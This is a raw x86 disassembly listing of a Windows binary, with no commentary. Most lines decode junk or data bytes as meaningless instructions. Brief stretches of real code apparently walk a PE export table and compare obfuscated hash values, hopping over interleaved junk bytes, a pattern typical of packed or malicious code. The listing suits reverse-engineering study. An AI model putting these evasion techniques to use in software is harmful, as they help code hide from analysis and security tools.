  40210c:	or     cl,BYTE PTR [eax+0x4a70ccc6]
  402112:	into   
  402113:	(bad)  
  402114:	dec    edx
  402115:	pop    eax
  402116:	cwde   
  402117:	xchg   ebx,eax
  402118:	fs xchg ah,ch
  40211b:	call   0x600b:0x816427c6
  402122:	add    al,0x35
  402124:	int    0x61
  402126:	cdq    
  402127:	in     eax,0x82
  402129:	cmp    DWORD PTR [ebx+0x6d],ecx
  40212c:	mov    ah,0xe
  40212e:	jg     0x402195
  402130:	addr16 daa 
  402132:	(bad)
  402135:	xchg   edi,eax
  402136:	adc    ecx,edx
  402138:	xor    eax,0x9e1afc9c
  40213d:	stc    
  40213e:	imul   ecx,DWORD PTR [edi+0x7740b956],0x1
  402145:	cmp    al,0x16
  402147:	shl    BYTE PTR [edi],1
  402149:	cld    
  40214a:	test   cl,dh
  40214c:	inc    ebx
  40214d:	xor    DWORD PTR [edi-0xb4b49b6],ebp
  402153:	repnz outs dx,BYTE PTR ds:[esi]
  402155:	ins    DWORD PTR es:[edi],dx
  402156:	scas   al,BYTE PTR es:[edi]
  402157:	jne    0x402100
  402159:	fcompp 
  40215b:	loopne 0x402181
  40215d:	aad    0x5b
  40215f:	(bad)  
  402161:	out    0x99,eax
  402163:	fnstenv [ebx]
  402165:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402166:	mov    ecx,0xc54f52a7
  40216b:	fs jo  0x402178
  40216e:	dec    ebx
  40216f:	lods   eax,DWORD PTR ds:[esi]
  402170:	mov    edi,DWORD PTR [esi]
  402172:	ret    0x442b
  402175:	lods   al,BYTE PTR ds:[esi]
  402176:	jmp    0x4b28d3f4
  40217b:	or     ebx,edx
  40217d:	fcomp  DWORD PTR [ebx-0x3a082e8]
  402183:	shl    BYTE PTR [edx],0x21
  402186:	pop    esi
  402187:	cs sbb esp,ecx
  40218a:	xor    al,0x78
  40218c:	mov    eax,ds:0x8a035646
  402191:	mov    edx,0x41f0feff
  402196:	mov    bl,0x46
  402198:	je     0x40215d
  40219a:	test   eax,0x8821082f
  40219f:	inc    esp
  4021a0:	cdq    
  4021a1:	outs   dx,BYTE PTR ds:[esi]
  4021a2:	scas   al,BYTE PTR es:[edi]
  4021a3:	adc    al,0x3b
  4021a5:	xchg   edi,eax
  4021a6:	nop
  4021a7:	jo     0x40212c
  4021a9:	add    BYTE PTR [edi+0x64c74c1f],bl
  4021af:	loop   0x40221b
  4021b1:	xchg   ecx,eax
  4021b2:	pushf  
  4021b3:	mov    bh,0xb7
  4021b5:	push   eax
  4021b6:	les    ebp,FWORD PTR ds:0x6b59f76f
  4021bc:	mov    DWORD PTR [ebx-0x5de252b6],esp
  4021c2:	ss dec esp
  4021c4:	xchg   BYTE PTR [esi+0x773a148],ah
  4021ca:	fidiv  DWORD PTR [esi]
  4021cc:	(bad)  [ebp+0xc]
  4021cf:	in     al,0x13
  4021d1:	int3   
  4021d2:	(bad)  
  4021d4:	daa    
  4021d5:	idiv   ebp
  4021d7:	adc    BYTE PTR [edx],bh
  4021d9:	rcl    DWORD PTR [ebx+0x19],1
  4021dc:	jl     0x402216
  4021de:	ins    BYTE PTR es:[edi],dx
  4021df:	cld    
  4021e0:	sahf   
  4021e1:	fdiv   st,st(5)
  4021e3:	jbe    0x4021ba
  4021e5:	xchg   edi,eax
  4021e6:	je     0x40222a
  4021e8:	jmp    0xeda2:0x16f0bba1
  4021ef:	mov    BYTE PTR [edi+edi*4+0x79],bh
  4021f3:	int3   
  4021f4:	jno    0x4021a8
  4021f6:	dec    edx
  4021f7:	rcr    BYTE PTR [esi],0xf0
  4021fa:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021fc:	lahf   
  4021fd:	inc    edi
  4021fe:	push   edx
  4021ff:	jmp    0xc01b3841
  402204:	fst    st(0)
  402206:	addr16 ja 0x4021e1
  402209:	pop    edx
  40220a:	mov    ch,0x19
  40220c:	retf   0xd918
  40220f:	pop    ebx
  402210:	mov    esp,0x18ae708
  402215:	dec    ecx
  402216:	repz sbb DWORD PTR [edi-0x28],0x686b7b38
  40221e:	mov    dl,0x4f
  402220:	push   es
  402221:	arpl   WORD PTR [ebp+0x1b],sp
  402224:	xchg   ebx,eax
  402225:	mov    al,ds:0xaa2698eb
  40222a:	aas    
  40222b:	sbb    al,0x3f
  40222d:	pop    eax
  40222e:	or     al,0x68
  402230:	sub    eax,DWORD PTR [edi+0x69b3737b]
  402236:	cmp    DWORD PTR [edi+0x6c],0xffffffba
  40223a:	mov    al,ds:0x4764d578
  40223f:	add    DWORD PTR [edx+0x12],ebx
  402242:	test   eax,0xaaf41fa5
  402247:	jmp    0xa8e3473b
  40224c:	pop    ebx
  40224d:	cmp    BYTE PTR [ecx+0x71],ch
  402250:	out    dx,eax
  402251:	dec    ebp
  402252:	stos   DWORD PTR es:[edi],eax
  402253:	loop   0x4022c7
  402255:	xchg   edx,eax
  402256:	cdq    
  402257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402258:	icebp  
  402259:	lods   eax,DWORD PTR ds:[esi]
  40225a:	xor    esi,DWORD PTR [edx]
  40225c:	cmc    
  40225d:	das    
  40225e:	jne    0x402204
  402260:	jg     0x402211
  402262:	and    BYTE PTR [esi+eiz*2-0x77],bh
  402266:	dec    ebp
  402267:	cld    
  402268:	jmp    0x40227a
  40226d:	xor    eax,esi
  40226f:	lea    eax,[eax+ecx*1+0x327299]
  402276:	mov    WORD PTR [ebp-0x4],ax
  40227a:	mov    eax,DWORD PTR [ebp-0xc]
  40227d:	cmp    eax,ebx
  40227f:	je     0x402293
  402285:	mov    eax,DWORD PTR [ebp-0x8]
  402288:	mov    DWORD PTR [eax],0x60341e8e
  40228e:	jmp    0x4028b6
  402293:	mov    eax,DWORD PTR [ebp+0x8]
  402296:	mov    ecx,DWORD PTR [ebp-0x8]
  402299:	xor    eax,esi
  40229b:	add    eax,edi
  40229d:	cmp    DWORD PTR [ecx],eax
  40229f:	je     0x40289e
  4022a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4022a8:	mov    eax,DWORD PTR [ebp-0x8]
  4022ab:	mov    eax,DWORD PTR [eax]
  4022ad:	mov    eax,DWORD PTR [eax+0x3c]
  4022b0:	lea    ecx,[ecx*8+0x78]
  4022b7:	add    eax,ecx
  4022b9:	jmp    0x40248d
  4022be:	je     0x402337
  4022c0:	int3   
  4022c1:	xchg   ecx,eax
  4022c2:	int    0xbd
  4022c4:	jne    0x402339
  4022c6:	jae    0x4022b2
  4022c8:	(bad)  
  4022c9:	cmovle esi,DWORD PTR [ebx]
  4022cc:	cli    
  4022cd:	or     esi,DWORD PTR [esi-0x4a8181fd]
  4022d3:	jg     0x402353
  4022d5:	jle    0x4022a7
  4022d7:	ret    
  4022d8:	jmp    0x4ad:0x61a7dcf1
  4022df:	xchg   BYTE PTR [edx],ah
  4022e1:	xchg   DWORD PTR [eax+0x3c],edi
  4022e4:	mov    ss,WORD PTR [edi]
  4022e6:	fs out 0x80,al
  4022e9:	mov    ?,WORD PTR [edi+0x41a59061]
  4022ef:	retf   
  4022f0:	mov    BYTE PTR [ecx+0x1a],cl
  4022f3:	or     bl,al
  4022f5:	ins    DWORD PTR es:[edi],dx
  4022f6:	lods   eax,DWORD PTR ds:[esi]
  4022f7:	addr16 mov bl,0x55
  4022fa:	sub    DWORD PTR [ebp+0x6f],esp
  4022fd:	or     ah,BYTE PTR [esi+0x3af0b5af]
  402303:	cld    
  402304:	rol    DWORD PTR [ebx+edx*4+0x6c90746b],cl
  40230b:	dec    edx
  40230c:	repz cmp cl,cl
  40230f:	bound  ecx,QWORD PTR [ebp+ecx*2-0x386b88e4]
  402316:	xor    edx,DWORD PTR [ebx]
  402318:	sbb    ebp,DWORD PTR [esi-0x34]
  40231b:	and    al,BYTE PTR [esi+ecx*4+0x789593ab]
  402322:	aad    0x40
  402324:	adc    BYTE PTR [edx+0x3177d12d],al
  40232a:	push   es
  40232b:	mov    ecx,0x39bdd2d4
  402330:	jne    0x40237c
  402332:	sti    
  402333:	jl     0x40236c
  402335:	xor    BYTE PTR [edi],al
  402337:	enter  0x1ec5,0xa4
  40233b:	mov    ah,0x8b
  40233d:	mov    edi,edi
  40233f:	fdiv   st(0),st
  402341:	adc    eax,0xea09a42e
  402346:	(bad)  [ebp-0x60]
  402349:	lahf   
  40234a:	sbb    BYTE PTR ds:0x8dabdc45,dh
  402350:	push   0x5c
  402352:	push   ebp
  402353:	xor    esi,DWORD PTR [ebp+0x7f]
  402356:	mov    ebx,0xefb59639
  40235b:	cmp    al,0xd3
  40235d:	call   0xc2e97699
  402362:	xchg   esp,eax
  402363:	repnz lods eax,DWORD PTR ds:[esi]
  402365:	jl     0x40231c
  402367:	push   esp
  402368:	cdq    
  402369:	adc    al,0x53
  40236b:	or     ebp,DWORD PTR [eax-0x17]
  40236e:	push   esi
  40236f:	cmp    DWORD PTR [ebx-0x3f],edx
  402372:	cmc    
  402373:	adc    eax,DWORD PTR [eax+0x5d]
  402376:	retf   
  402377:	jecxz  0x4023be
  402379:	gs mov esp,esi
  40237c:	test   eax,0x22406b22
  402381:	inc    esi
  402382:	cmp    eax,0xaf0cf334
  402387:	js     0x402329
  402389:	shl    BYTE PTR [ebx-0x38aeba66],0x8f
  402390:	jmp    0xbe8d:0x248929e3
  402397:	das    
  402398:	push   bp
  40239a:	lea    ebp,[ebp-0xd]
  40239d:	inc    edi
  40239e:	(bad)  
  40239f:	mov    bl,0xfc
  4023a1:	or     DWORD PTR [ecx+0x62],esp
  4023a4:	sub    edi,DWORD PTR [ecx-0x296c0b18]
  4023aa:	mov    edi,0xdf2e35f8
  4023af:	stos   DWORD PTR es:[edi],eax
  4023b0:	mov    ebx,0xd7c16912
  4023b5:	sub    al,0x2
  4023b7:	dec    esp
  4023b8:	fwait
  4023b9:	outs   dx,DWORD PTR ds:[esi]
  4023ba:	jns    0x402360
  4023bc:	jbe    0x40235e
  4023be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023bf:	mov    bh,0xa9
  4023c1:	mov    esi,0x44000559
  4023c6:	sub    edx,DWORD PTR ds:0x561b88b
  4023cc:	shl    esp,cl
  4023ce:	jge    0x4023c3
  4023d0:	mov    DWORD PTR [edi+0x18ad136a],eax
  4023d6:	out    dx,al
  4023d7:	aad    0xb3
  4023d9:	push   es
  4023da:	push   ecx
  4023db:	push   0xe17f69c4
  4023e0:	sar    edi,1
  4023e2:	jmp    0xf4377ffd
  4023e7:	lock ja 0x4023c0
  4023ea:	xchg   BYTE PTR [edx+0x7ca0817f],cl
  4023f0:	adc    dl,BYTE PTR [edx]
  4023f2:	fiadd  DWORD PTR [edx+0x39]
  4023f5:	ret    
  4023f6:	pop    esp
  4023f7:	int3   
  4023f8:	jmp    0xa012:0x18d89da7
  4023ff:	into   
  402400:	sbb    eax,0x9223912c
  402405:	and    ecx,esp
  402407:	pop    ds
  402408:	or     eax,0x634b4029
  40240d:	mul    DWORD PTR [edi]
  40240f:	int    0x6e
  402411:	dec    ebx
  402412:	into   
  402413:	call   0x71bf406d
  402418:	out    0x4f,eax
  40241a:	jae    0x40242c
  40241c:	rol    al,1
  40241e:	cmp    eax,0xf717df56
  402423:	repnz and eax,esp
  402426:	fsub   QWORD PTR [edi]
  402428:	mov    ss,WORD PTR [ebp+0x37]
  40242b:	lock loopne 0x402486
  40242e:	bound  ecx,QWORD PTR [ebx-0x17]
  402431:	xchg   ecx,eax
  402432:	mov    bl,0x5a
  402434:	xchg   DWORD PTR [esi],eax
  402436:	inc    esp
  402437:	aad    0x6d
  402439:	js     0x4023f0
  40243b:	mov    ecx,0x184026b4
  402440:	sbb    al,0xdf
  402442:	lods   al,BYTE PTR ds:[esi]
  402443:	jp     0x402428
  402445:	mov    DWORD PTR ss:[edx+0x40],eax
  402449:	add    BYTE PTR [esi-0x7f],dh
  40244c:	xchg   ebp,eax
  40244d:	in     eax,dx
  40244e:	mov    dh,0xab
  402450:	imul   ecx,edx,0x4f129499
  402456:	int    0xfd
  402458:	rcl    DWORD PTR [ebx],0xcf
  40245b:	test   al,0xcb
  40245d:	retf   
  40245e:	jns    0x4023e7
  402460:	pop    ds
  402461:	dec    ecx
  402462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402463:	mov    DWORD PTR es:[esi],edi
  402466:	sbb    al,0xfb
  402468:	out    0x54,al
  40246a:	sbb    DWORD PTR [eax-0x366d4c8e],esi
  402470:	inc    esp
  402471:	arpl   di,ax
  402473:	xlat   BYTE PTR ds:[ebx]
  402474:	mov    al,0xb1
  402476:	into   
  402477:	rcr    BYTE PTR [esi+eiz*4],0x4b
  40247b:	cmp    DWORD PTR [eax-0x59],ebx
  40247e:	lods   al,BYTE PTR ds:[esi]
  40247f:	jecxz  0x402466
  402481:	rcl    dl,0x8f
  402484:	pop    ecx
  402485:	push   edx
  402486:	jecxz  0x40248f
  402488:	repz and DWORD PTR [esi],0x4d8bd946
  40248f:	clc    
  402490:	mov    ecx,DWORD PTR [ecx]
  402492:	mov    eax,DWORD PTR [eax+ecx*1]
  402495:	mov    DWORD PTR [ebp-0x1c],eax
  402498:	mov    eax,DWORD PTR [ebp+0x8]
  40249b:	xor    eax,esi
  40249d:	add    eax,edi
  40249f:	mov    DWORD PTR [ebp-0x20],eax
  4024a2:	mov    eax,DWORD PTR [ebp+0x8]
  4024a5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024a8:	xor    eax,esi
  4024aa:	add    eax,edi
  4024ac:	cmp    ecx,eax
  4024ae:	je     0x4028b6
  4024b4:	mov    eax,DWORD PTR [ebp-0x8]
  4024b7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024ba:	add    ecx,DWORD PTR [eax]
  4024bc:	jmp    0x402690
  4024c1:	xor    al,0x5a
  4024c3:	inc    edx
  4024c4:	pop    ebp
  4024c5:	pop    esp
  4024c6:	jge    0x4024fd
  4024c8:	arpl   WORD PTR [edx],ax
  4024ca:	outs   dx,BYTE PTR ds:[esi]
  4024cb:	dec    esi
  4024cc:	or     eax,0x1f9de981
  4024d1:	in     eax,dx
  4024d2:	or     eax,0x7fb57e7e
  4024d7:	jle    0x402557
  4024d9:	pop    esi
  4024da:	add    DWORD PTR [esi-0x39],edx
  4024dd:	push   ds
  4024de:	jmp    0xaeace396
  4024e3:	dec    edx
  4024e4:	and    eax,0xbd4d49a0
  4024e9:	and    edi,DWORD PTR [esi-0x72]
  4024ec:	imul   edi,DWORD PTR [esi+0x69484ea8],0xa2880823
  4024f6:	pop    ss
  4024f7:	lea    eax,[esi-0x59]
  4024fa:	retf   0xe1c6
  4024fd:	push   edi
  4024fe:	call   0x1d73a15f
  402503:	dec    ecx
  402504:	std    
  402505:	adc    eax,DWORD PTR gs:[ebx-0x78d8b593]
  40250c:	push   eax
  40250d:	in     eax,dx
  40250e:	and    DWORD PTR [esi-0x55],ecx
  402511:	pop    esi
  402512:	out    0x73,eax
  402514:	sti    
  402515:	fdivr  QWORD PTR [eax-0x43]
  402518:	inc    ebp
  402519:	sbb    eax,DWORD PTR [esi+ecx*1+0x52]
  40251d:	pop    esi
  40251e:	mov    ecx,DWORD PTR [edi]
  402520:	dec    eax
  402521:	ret    
  402522:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402523:	xchg   ebx,eax
  402524:	push   cs
  402525:	out    dx,eax
  402526:	shl    DWORD PTR [esp+ecx*8],1
  402529:	push   ecx
  40252a:	cmp    BYTE PTR [esi],0x91
  40252d:	mov    ch,0x2b
  40252f:	dec    eax
  402530:	in     al,0x8b
  402532:	test   DWORD PTR [esi-0x782c45e8],ebx
  402538:	(bad)  
  402539:	mov    edx,0xf92ce910
  40253e:	push   eax
  40253f:	fwait
  402540:	inc    eax
  402541:	xchg   esp,eax
  402542:	xor    esi,ebx
  402544:	adc    dl,BYTE PTR [edx]
  402546:	je     0x4024ea
  402548:	mov    ah,0x2c
  40254a:	ja     0x40251f
  40254c:	cmp    dh,ch
  40254e:	cs inc ecx
  402550:	and    DWORD PTR [ecx+0x26],esp
  402553:	jmp    0x40251b
  402555:	adc    BYTE PTR [ebx],dh
  402557:	mov    dh,0xee
  402559:	jae    0x402531
  40255b:	push   ecx
  40255c:	jbe    0x40253c
  40255e:	sub    DWORD PTR [esp+ebp*1-0x7bd774cb],eax
  402565:	ffreep st(1)
  402567:	(bad)  
  402568:	jge    0x402575
  40256a:	jmp    0xd6fded51
  40256f:	mov    al,0xe3
  402571:	loopne 0x402517
  402573:	mov    ds:0x2213298c,al
  402578:	aaa    
  402579:	lahf   
  40257a:	mov    al,0xf9
  40257c:	nop
  40257d:	adc    al,0x48
  40257f:	ret    0xd35a
  402582:	popf   
  402583:	mov    eax,0xb25e1dce
  402588:	sahf   
  402589:	stos   BYTE PTR es:[edi],al
  40258a:	jmp    0x402531
  40258c:	add    DWORD PTR [esi+0x1c],edi
  40258f:	fdivr  DWORD PTR [esi+0xc]
  402592:	xchg   DWORD PTR [edx-0x6b],ecx
  402595:	xor    esp,DWORD PTR [eax+esi*1-0x24]
  402599:	mov    esp,0x8d8f8288
  40259e:	mov    WORD PTR [edi],gs
  4025a0:	sti    
  4025a1:	divps  xmm1,XMMWORD PTR [esi+0xf801bad]
  4025a8:	inc    ecx
  4025a9:	aam    0xe7
  4025ab:	outs   dx,DWORD PTR ds:[esi]
  4025ac:	call   0x8308:0xe920d862
  4025b3:	pop    ss
  4025b4:	jle    0x4025c9
  4025b6:	mov    ds:0xcd12a870,al
  4025bb:	xchg   ebp,eax
  4025bc:	mov    BYTE PTR ds:0x8da75590,dl
  4025c2:	cdq    
  4025c3:	imul   esp,DWORD PTR [esi],0xd6248f6d
  4025c9:	imul   ebx,DWORD PTR [eax-0x15],0x2f11bd
  4025d0:	daa    
  4025d1:	cmp    edi,eax
  4025d3:	fincstp 
  4025d5:	push   ebp
  4025d6:	out    dx,al
  4025d7:	cmp    cl,BYTE PTR [ebx-0x6245dd5b]
  4025dd:	sbb    eax,0x1ea83e15
  4025e2:	ror    DWORD PTR [edi-0x24],cl
  4025e5:	clc    
  4025e6:	sub    eax,0x6f88f8cc
  4025eb:	lea    edi,ds:0xd687d888
  4025f1:	mov    bl,0x53
  4025f3:	or     edx,DWORD PTR [ecx-0x37]
  4025f6:	inc    ebp
  4025f7:	push   edi
  4025f8:	mov    ds:0xf638d027,al
  4025fd:	std    
  4025fe:	cmp    al,0xc8
  402600:	fist   DWORD PTR [ebx+ebx*2]
  402603:	adc    DWORD PTR [ebx-0x2b],0x4b
  402607:	sbb    al,0x77
  402609:	repnz mov esp,0x166a5d18
  40260f:	xor    BYTE PTR [edi],ah
  402611:	retf   
  402612:	cmc    
  402613:	inc    esp
  402614:	arpl   ax,bx
  402616:	pop    es
  402617:	jle    0x40263e
  402619:	adc    eax,0xfa579277
  40261e:	push   cs
  40261f:	in     eax,0x3a
  402621:	in     al,0x8e
  402623:	mov    al,0x4c
  402625:	mov    ds:0xba38b517,al
  40262a:	mov    ah,bh
  40262c:	push   ecx
  40262d:	adc    BYTE PTR [edx-0x25],cl
  402630:	xchg   esp,eax
  402631:	ror    DWORD PTR [eax+0x69928f05],cl
  402637:	aas    
  402638:	jae    0x402644
  40263a:	xor    BYTE PTR [eax-0x1f],0xc6
  40263e:	cmp    eax,0x6f48746b
  402643:	les    ebx,FWORD PTR [ebp+ebp*8-0x56]
  402647:	(bad)  
  402648:	and    BYTE PTR [edx],bh
  40264a:	push   esi
  40264b:	jns    0x4026ba
  40264d:	aaa    
  40264e:	and    DWORD PTR [ebp-0x7dd002a2],eax
  402654:	call   0xa705:0x93fa536e
  40265b:	fcmove st,st(0)
  40265d:	fs retf 0x4731
  402661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402662:	(bad)  
  402663:	scas   al,BYTE PTR es:[edi]
  402664:	sub    dl,bl
  402666:	cwde   
  402667:	cld    
  402668:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402669:	xlat   BYTE PTR ds:[ebx]
  40266a:	push   ebx
  40266b:	ror    BYTE PTR [ebx+0x26],0x44
  40266f:	clc    
  402670:	clc    
  402671:	adc    edx,DWORD PTR [edx+eax*2]
  402674:	pusha  
  402675:	bnd js 0x402605
  402678:	(bad)
  40267b:	repnz sbb cl,BYTE PTR [ebx-0xeb369d4]
  402682:	jne    0x4026d7
  402684:	repnz inc eax
  402686:	fistp  DWORD PTR [edi-0x75]
  402689:	add    al,0x6e
  40268b:	pushf  
  40268c:	xor    BYTE PTR [eax+0x57],al
  40268f:	in     al,dx
  402690:	mov    DWORD PTR [ebp-0x20],ecx
  402693:	mov    eax,DWORD PTR [ebp-0x20]
  402696:	mov    ecx,DWORD PTR [ebp-0x8]
  402699:	mov    eax,DWORD PTR [eax+0xc]
  40269c:	mov    ecx,DWORD PTR [ecx]
  40269e:	mov    al,BYTE PTR [eax+ecx*1]
  4026a1:	add    al,0x3a
  4026a3:	xor    al,0x44
  4026a5:	cmp    al,0xc1
  4026a7:	je     0x402892
  4026ad:	mov    eax,DWORD PTR [ebp+0x8]
  4026b0:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b3:	xor    eax,esi
  4026b5:	add    eax,edi
  4026b7:	jmp    0x40288b
  4026bc:	ins    BYTE PTR es:[edi],dx
  4026bd:	jo     0x4026e5
  4026bf:	arpl   WORD PTR [edx],si
  4026c1:	jge    0x402730
  4026c3:	jno    0x402694
  4026c5:	adc    al,0x86
  4026c7:	mov    dl,0x7c
  4026c9:	mov    dh,0xbe
  4026cb:	xchg   esi,eax
  4026cc:	and    al,0xf
  4026ce:	jle    0x40274e
  4026d0:	mov    ch,0x7f
  4026d2:	jle    0x402752
  4026d4:	push   edi
  4026d5:	fucom  st(0)
  4026d7:	jmp    FWORD PTR [edx]
  4026d9:	mov    al,ds:0x54581822
  4026de:	and    bh,BYTE PTR [ecx+0x6a]
  4026e1:	pop    ds
  4026e2:	cdq    
  4026e3:	es mov ch,0x41
  4026e6:	repz out dx,al
  4026e8:	mov    al,0x14
  4026ea:	add    cl,dh
  4026ec:	pop    esi
  4026ed:	sar    al,cl
  4026ef:	cmp    eax,DWORD PTR [ecx-0x464bd1c7]
  4026f5:	or     al,0x27
  4026f7:	and    al,0x39
  4026f9:	(bad)  
  4026fb:	mov    dh,0x21
  4026fd:	or     cl,BYTE PTR [ebp-0x57]
  402700:	ja     0x4026bb
  402702:	(bad)  
  402703:	repz push ecx
  402705:	stos   BYTE PTR es:[edi],al
  402706:	add    al,0xc
  402708:	retf   0xc8c4
  40270b:	aam    0x3c
  40270d:	loope  0x402783
  40270f:	xchg   edi,eax
  402710:	pop    edi
  402711:	xchg   ecx,eax
  402712:	xor    ah,BYTE PTR [esi-0x2d5f1923]
  402718:	pop    edx
  402719:	aaa    
  40271a:	sub    al,0xd8
  40271c:	or     BYTE PTR [ebp+0x48],ch
  40271f:	fild   QWORD PTR [edi]
  402721:	std    
  402722:	pop    ebp
  402723:	retf   
  402724:	test   al,0x7
  402726:	sbb    edx,DWORD PTR [edx]
  402728:	add    DWORD PTR [ebx],ebx
  40272a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40272b:	adc    bh,dl
  40272d:	lods   eax,DWORD PTR ds:[esi]
  40272e:	push   cs
  40272f:	int    0x7b
  402731:	cmp    al,bl
  402733:	mov    edx,0xd9868c31
  402738:	pop    eax
  402739:	adc    edx,DWORD PTR [eax+0x1e]
  40273c:	sub    al,0x52
  40273e:	mov    bl,0xf
  402740:	jl     0x402724
  402742:	cmc    
  402743:	ss dec edx
  402745:	xor    al,0x7
  402747:	dec    ecx
  402748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402749:	add    DWORD PTR [esi],eax
  40274b:	or     BYTE PTR [edi-0xc],ah
  40274e:	mov    ds:0xd918834f,eax
  402753:	xchg   ebx,eax
  402754:	xor    DWORD PTR [esi+0x54],eax
  402757:	test   al,0xd1
  402759:	imul   BYTE PTR [edx]
  40275b:	imul   esp,ebx,0x1dfe24e8
  402761:	out    0x8a,eax
  402763:	daa    
  402764:	xor    DWORD PTR [eax],0xffffff97
  402767:	mov    al,0xec
  402769:	stos   BYTE PTR es:[edi],al
  40276a:	je     0x4027d0
  40276c:	out    0xbc,al
  40276e:	sub    al,0xcb
  402770:	scas   eax,DWORD PTR es:[edi]
  402771:	mov    ebp,DWORD PTR [ebx+edx*8-0x4e]
  402775:	iret   
  402776:	dec    esi
  402777:	or     bl,BYTE PTR [edx]
  402779:	(bad)  [ebp-0x30]
  40277c:	xchg   edx,edx
  40277e:	mov    bl,BYTE PTR [ebp-0x7299d192]
  402784:	sbb    eax,DWORD PTR [eax+0x29]
  402787:	cld    
  402788:	sub    al,0x3d
  40278a:	jns    0x402802
  40278c:	jae    0x8ec7b3f9
  402792:	xor    ebx,DWORD PTR [ecx+0x228bff23]
  402798:	lods   al,BYTE PTR ds:[esi]
  402799:	aad    0xbd
  40279b:	fwait
  40279c:	stc    
  40279d:	sbb    eax,0x574948d1
  4027a2:	enter  0x4223,0x66
  4027a6:	dec    ebp
  4027a7:	test   eax,0x5e990c1
  4027ac:	inc    bl
  4027ae:	mov    BYTE PTR fs:[edx-0x4c],bh
  4027b2:	sub    al,0x78
  4027b4:	(bad)  [edi+esi*4-0x13]
  4027b8:	imul   esp,DWORD PTR [ecx],0x4cf9ddb8
  4027be:	loop   0x402756
  4027c0:	loope  0x40275e
  4027c2:	or     cl,BYTE PTR [ecx-0x5d14537b]
  4027c8:	pop    ecx
  4027c9:	mov    ecx,0x40bde9a4
  4027ce:	lods   eax,DWORD PTR ds:[esi]
  4027cf:	xchg   ebx,eax
  4027d0:	repnz outs dx,BYTE PTR ds:[esi]
  4027d2:	adc    ch,BYTE PTR [eax-0x1a8cc49f]
  4027d8:	outs   dx,DWORD PTR ds:[esi]
  4027d9:	loopne 0x402823
  4027db:	jns    0x4027e3
  4027dd:	jge    0x40277e
  4027df:	(bad)
  4027e2:	lds    eax,FWORD PTR [eax-0x9]
  4027e5:	not    BYTE PTR [edi]
  4027e7:	inc    edi
  4027e8:	pop    ecx
  4027e9:	aam    0x97
  4027eb:	xor    BYTE PTR [edi-0x71c45550],bh
  4027f1:	mov    ebp,0x10c4ba5e
  4027f6:	jo     0x402839
  4027f8:	lea    esp,[ecx]
  4027fa:	stc    
  4027fb:	std    
  4027fc:	inc    edx
  4027fd:	xor    esi,esp
  4027ff:	push   ds
  402800:	jecxz  0x402845
  402802:	push   ecx
  402803:	mov    esp,cr0
  402806:	pop    eax
  402807:	mov    dh,ah
  402809:	mov    cl,0xcc
  40280b:	adc    al,0x43
  40280d:	js     0x402803
  40280f:	in     eax,0x79
  402811:	test   BYTE PTR [ebp+0x34df5f89],0xa4
  402818:	mov    ecx,0x9ff56211
  40281d:	and    esp,DWORD PTR [esi]
  40281f:	mov    edx,0xdbed5f66
  402824:	jno    0x4028a0
  402826:	and    edx,ecx
  402828:	jp     0x40286a
  40282a:	mov    bl,0x37
  40282c:	clc    
  40282d:	xchg   edi,eax
  40282e:	xor    esp,esp
  402830:	ror    dl,1
  402832:	jbe    0x40283f
  402834:	pop    ecx
  402835:	imul   ebx,eax,0xd37ef9f2
  40283b:	shl    BYTE PTR [eax+edx*2+0x59f3c384],1
  402842:	sbb    BYTE PTR [bp+di],ch
  402845:	or     al,BYTE PTR [ecx-0x2eda11e4]
  40284b:	push   edx
  40284c:	jb     0x402844
  40284e:	or     BYTE PTR [ebp-0x2d70de12],ah
  402854:	imul   esp,ecx,0x39
  402857:	clc    
  402858:	xchg   esp,eax
  402859:	xchg   esi,eax
  40285a:	fcmovb st,st(3)
  40285c:	push   es
  40285d:	retf   0x1e60
  402860:	scas   eax,DWORD PTR es:[edi]
  402861:	mov    al,0xee
  402863:	sbb    ebp,DWORD PTR [esi+ebx*1-0x33]
  402867:	leave  
  402868:	ret    0xb9e8
  40286b:	lock les edi,FWORD PTR [ebp+0x25]
  40286f:	shr    BYTE PTR [eax+0x6ff2744c],1
  402875:	sub    ecx,eax
  402877:	cld    
  402878:	aaa    
  402879:	push   edx
  40287a:	push   ebp
  40287b:	loope  0x402874
  40287d:	icebp  
  40287e:	(bad)  
  402881:	loopne 0x40288d
  402883:	mov    cl,0x42
  402885:	pop    edx
  402886:	dec    eax
  402887:	cmp    ch,BYTE PTR [esp+esi*2]
  40288a:	aad    0x89
  40288c:	add    ecx,ebp
  40288e:	and    al,0x0
  402890:	add    BYTE PTR [eax],al
  402892:	xor    DWORD PTR [ebp-0xc],0x5fd8c
  402899:	jmp    0x4028b6
  40289e:	mov    eax,DWORD PTR [ebp-0x8]
  4028a1:	mov    ecx,DWORD PTR [ebp-0x18]
  4028a4:	mov    ecx,DWORD PTR [ecx]
  4028a6:	mov    DWORD PTR [eax],ecx
  4028a8:	mov    eax,DWORD PTR [ebp+0xc]
  4028ab:	mov    eax,DWORD PTR [ebp+0x8]
  4028ae:	push   DWORD PTR [ebp-0x8]
  4028b1:	call   0x405275
  4028b6:	mov    eax,DWORD PTR [ebp-0xc]
  4028b9:	cmp    eax,ebx
  4028bb:	je     0x4015da
  4028c1:	mov    eax,DWORD PTR [ebp-0x8]
  4028c4:	mov    eax,DWORD PTR [eax]
  4028c6:	pop    edi
  4028c7:	pop    esi
  4028c8:	pop    ebx
  4028c9:	leave  
  4028ca:	ret    0xc
  4028cd:	push   ebp
  4028ce:	mov    ebp,esp
  4028d0:	sub    esp,0x18
  4028d3:	leave  
  4028d4:	ret    0x8
  4028d7:	push   ebp
  4028d8:	mov    ebp,esp
  4028da:	jmp    0x402a17
  4028df:	sbb    eax,0xb1fd9f1a
  4028e4:	jge    0x402943
  4028e6:	fidivr DWORD PTR [eax+0x42de0451]
